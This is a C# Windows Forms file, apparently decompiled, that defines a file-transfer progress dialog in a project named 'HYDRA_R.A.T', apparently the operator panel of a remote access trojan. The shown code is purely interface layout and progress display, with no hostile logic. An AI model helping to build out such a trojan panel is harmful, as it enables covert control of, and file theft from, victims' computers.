using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Bunifu_Controls;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace HYDRA_R.A.T
{
	public class FrmTransfer : Form
	{
		public int int_0;

		private IContainer components;

		private BunifuProgressBar DuplicateProgess;

		private Label FileTransferLabel;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator4;

		private BunifuSeparator bunifuSeparator5;

		private BunifuSeparator bunifuSeparator2;

		private BunifuIconButton bunifuIconButton4;

		private CustomLabel customLabel1;

		private Guna2ShadowForm guna2ShadowForm1;

		public BunifuProgressBar DuplicateProgesse
		{
			get
			{
				return this.DuplicateProgess;
			}
			set
			{
				this.DuplicateProgess = value;
			}
		}

		public Label FileTransferLabele
		{
			get
			{
				return this.FileTransferLabel;
			}
			set
			{
				this.FileTransferLabel = value;
			}
		}

		public FrmTransfer()
		{
			this.int_0 = 0;
			this.InitializeComponent();
		}

		private void FrmTransfer_Load(object sender, EventArgs e)
		{
		}

		public void DuplicateProfile(int int_1)
		{
			if (int_1 > this.int_0)
			{
				int_1 = this.int_0;
			}
			this.FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(this.int_0) + " MB";
			this.DuplicateProgess.Value = int_1;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HYDRA_R.A.T.FrmTransfer));
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.DuplicateProgess = new Bunifu.UI.WinForms.BunifuProgressBar();
			this.FileTransferLabel = new System.Windows.Forms.Label();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator5 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuIconButton4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.customLabel1 = new Bunifu_Controls.CustomLabel();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			base.SuspendLayout();
			this.DuplicateProgess.AllowAnimations = false;
			this.DuplicateProgess.Animation = 0;
			this.DuplicateProgess.AnimationSpeed = 220;
			this.DuplicateProgess.AnimationStep = 10;
			this.DuplicateProgess.BackColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.DuplicateProgess.BackgroundImage = (System.Drawing.Image)resources.GetObject("DuplicateProgess.BackgroundImage");
			this.DuplicateProgess.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.DuplicateProgess.BorderRadius = 9;
			this.DuplicateProgess.BorderThickness = 1;
			this.DuplicateProgess.Location = new System.Drawing.Point(63, 91);
			this.DuplicateProgess.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.DuplicateProgess.Maximum = 100;
			this.DuplicateProgess.MaximumValue = 100;
			this.DuplicateProgess.Minimum = 0;
			this.DuplicateProgess.MinimumValue = 0;
			this.DuplicateProgess.Name = "DuplicateProgess";
			this.DuplicateProgess.Orientation = System.Windows.Forms.Orientation.Horizontal;
			this.DuplicateProgess.ProgressBackColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.DuplicateProgess.ProgressColorLeft = System.Drawing.Color.FromArgb(226, 28, 71);
			this.DuplicateProgess.ProgressColorRight = System.Drawing.Color.FromArgb(45, 47, 59);
			this.DuplicateProgess.Size = new System.Drawing.Size(442, 17);
			this.DuplicateProgess.TabIndex = 0;
			this.DuplicateProgess.Value = 50;
			this.DuplicateProgess.ValueByTransition = 50;
			this.FileTransferLabel.AutoSize = true;
			this.FileTransferLabel.Location = new System.Drawing.Point(254, 137);
			this.FileTransferLabel.Name = "FileTransferLabel";
			this.FileTransferLabel.Size = new System.Drawing.Size(37, 20);
			this.FileTransferLabel.TabIndex = 5;
			this.FileTransferLabel.Text = "Idle";
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-5, -2);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator1.Size = new System.Drawing.Size(10, 218);
			this.bunifuSeparator1.TabIndex = 6;
			this.bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator4.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator4.LineThickness = 1;
			this.bunifuSeparator4.Location = new System.Drawing.Point(2, 202);
			this.bunifuSeparator4.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.bunifuSeparator4.Name = "bunifuSeparator4";
			this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator4.Size = new System.Drawing.Size(554, 15);
			this.bunifuSeparator4.TabIndex = 9;
			this.bunifuSeparator5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator5.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator5.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator5.BackgroundImage");
			this.bunifuSeparator5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator5.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator5.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator5.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator5.LineThickness = 1;
			this.bunifuSeparator5.Location = new System.Drawing.Point(552, -4);
			this.bunifuSeparator5.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
			this.bunifuSeparator5.Name = "bunifuSeparator5";
			this.bunifuSeparator5.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator5.Size = new System.Drawing.Size(10, 220);
			this.bunifuSeparator5.TabIndex = 10;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(2, -7);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(9, 12, 9, 12);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(554, 15);
			this.bunifuSeparator2.TabIndex = 11;
			this.bunifuIconButton4.AllowAnimations = true;
			this.bunifuIconButton4.AllowBorderColorChanges = true;
			this.bunifuIconButton4.AllowMouseEffects = true;
			this.bunifuIconButton4.AnimationSpeed = 200;
			this.bunifuIconButton4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton4.BorderRadius = 1;
			this.bunifuIconButton4.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton4.BorderThickness = 1;
			this.bunifuIconButton4.ColorContrastOnClick = 30;
			this.bunifuIconButton4.ColorContrastOnHover = 30;
			this.bunifuIconButton4.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.bunifuIconButton4.CustomizableEdges = borderEdges;
			this.bunifuIconButton4.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton4.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton4.Image");
			this.bunifuIconButton4.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton4.Location = new System.Drawing.Point(12, 12);
			this.bunifuIconButton4.Name = "bunifuIconButton4";
			this.bunifuIconButton4.RoundBorders = false;
			this.bunifuIconButton4.ShowBorders = true;
			this.bunifuIconButton4.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton4.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton4.TabIndex = 18;
			this.customLabel1.AutoSize = true;
			this.customLabel1.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.customLabel1.Location = new System.Drawing.Point(53, 27);
			this.customLabel1.Name = "customLabel1";
			this.customLabel1.Size = new System.Drawing.Size(58, 20);
			this.customLabel1.TabIndex = 17;
			this.customLabel1.Text = "Tranfer";
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(558, 210);
			base.Controls.Add(this.bunifuIconButton4);
			base.Controls.Add(this.customLabel1);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.bunifuSeparator4);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.FileTransferLabel);
			base.Controls.Add(this.DuplicateProgess);
			base.Controls.Add(this.bunifuSeparator5);
			this.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			base.Name = "FrmTransfer";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "FrmTransfer";
			base.Load += new System.EventHandler(FrmTransfer_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
